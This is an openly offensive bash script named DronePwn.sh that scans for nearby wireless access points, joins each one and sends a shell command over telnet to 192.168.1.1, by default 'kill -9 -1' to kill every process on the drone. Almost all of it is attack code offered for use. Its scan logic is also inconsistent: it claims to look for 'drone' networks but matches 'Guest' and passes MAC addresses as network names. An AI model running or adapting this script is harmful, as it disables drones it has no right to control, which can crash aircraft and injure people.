# DronePwn.sh
# Based on Darren Kitchen Conecpt
# Written for OS X 10.9, then rewritten for any linux distro with net-tools installed
# Rewritten by Tesla taking in a networking course (also bored out of his mind)
# Usage: bash dronepwn.sh [interface] [shell command to run on drone]
#        Both arguments are optional
#!/bin/bash
INTERFACE=''
COMMAND=''
ABRT_WHEN_POSSIBLE=false
function error {
	printf "\e[31m%s\r\n\e[39m" "$1"
}

function warn {
	printf "\e[33m%s\r\n\e[39m" "$1"
}

function log {
	printf "\e[34m%s\e\n\e[39m" "$1"
}

function abrt {
	log "[*] Caught interrupt, finishing. . ."
	ABRT_WHEN_POSSIBLE=true
}

function pwn_network {
	if iwconfig  $INTERFACE essid $1 > /dev/null 2>/dev/null
		then
			log "[*] Success!"
			log "[*] Attemting to connect and issue kill command. . ."
			printf "$COMMAND\r\n\r\n" | nc 192.168.1.1 23
			log "[*] Moving to next AP (if any). . ."
		else
			error "[!] Failed to associate!"
		fi
}

function pwn_networks {
	for ntwrk in $1
	do
		log "[*] Attemting to associate with ESSID: ${ntwrk}. . ."
		pwn_network "${ntwrk}"
	done
}

trap abrt SIGINT

if [[ $ABRT_WHEN_POSSIBLE = true ]]; then exit 0; fi
if [[ -z $1 ]]
then
	warn "[-] No interface specified, attemting to determine wireless interface (this will not work if you are currently not connected to a network). . ."
	INTERFACE=$(ifconfig | grep -B1 'inet ' | grep -v 'lo:' | grep 'mtu' | sed 's/://' | awk '{print $1}')
	warn "[-] Selected $INTERFACE as wireless interface"
else
	INTERFACE=$1
fi
if [[ $ABRT_WHEN_POSSIBLE = true ]]; then exit 0; fi
if [[ -z $2 ]]
then
	COMMAND="kill -9 -1"
	log "[*] Custom command left blank, using \"kill -9 -1\" (this will force all running processes to terminate)"
else
	COMMAND=$2
fi
if [[ $ABRT_WHEN_POSSIBLE = true ]]; then exit 0; fi

while (true) do
	log "[*] Scanning for APs with ESSIDs that contain 'drone'. . ."
	ntwrks=( $(iwlist scan | grep -B5 'Guest' | grep 'Address:' | awk '{print $5}') )
	pwn_networks "${ntwrks[@]}"
	if [[ $ABRT_WHEN_POSSIBLE = true ]]; then exit 0; fi
	sleep 1
done
